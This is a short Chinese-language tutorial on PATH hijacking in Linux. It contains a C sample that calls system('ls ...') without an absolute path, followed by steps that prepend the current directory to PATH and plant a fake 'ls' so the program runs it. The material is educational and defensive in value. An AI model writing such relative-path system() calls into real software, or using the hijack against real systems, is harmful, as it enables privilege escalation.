# 利用 Linux 系统上的 uitls 检索机制



[Video Hindi](https://www.youtube.com/watch?v=VVFnA7yYFqE&t=42s)

​	在linux文件系统中，/bin/* 目录下通常存放的是系统基本的常用的binary（可执行程序，并且可以直接type命令执行），像这样的程序（或脚本）还不仅仅只存储在这一个目录，还存储在许多其它不同的地方。如何查看这些目录呢？可以通过环境变量 **$PATH** 查看：

`echo $PATH`
`/usr/local/bin:/usr/bin:/bin:/usr/sbin:/sbin`

得到了一系列路径。

```C
#include <stdio.h>
#include <stdlib.h>

int main(){
    system("ls /tmp/file.dat");
    return 0;
}
```
假设有人编写了这样的一个程序。这个程序执行的时候，会调用 libc 函数 `system()` 用它来执行系统命令 `ls /tmp/file.dat` , `system()` 函数会在当前shell中执行传入给它命令。

我们需要注意，这个程序代码中存中一个问题，在提供给`system()` 执行的命令中，使用了Linux 程序 `ls` 并且这里并没有指定绝对路径。那么程序在执行的时候怎样知道binary  `ls` 放在哪里呢？答案就是会在系统的 PATH 变量中查找。（需要注意查找的过程在有一个规则，从左往右找，如果找到就不用找了。也就是说最左的路径优先级最高）



## 那我们是不是可以修改 `$PATH` ?



​	由于 `$PATH` 是shell中的环境变量，它可以被使用当前shell的用户自行修改。



​	设想我在当前目录 `$PWD` 下创建一个名为 `ls` 的binary 文件。然后修改 `$PATH` 让当前目录具有最高的搜索优先级。这样，当系统寻找 `ls` 的时候，就会找到我的 `ls`。



## 来尝试构造一个实际的利用。



 1. 更新 `$PATH` 变量，让它最优先搜索路径为我们的当期路径。`export PATH=$PWD:$PATH`

 2. 复制程序 `cat` 为 `ls` 到当前目录 

    ```shell
    cp `which cat` ls
    ```

1. [可选] 再检查一遍看看 `$PATH` 是否已经被我们所更新了。 
2. 然后执行程序 :metal:

你会发现你的 `ls` 命令会变成执行 `cat`.
:smile:
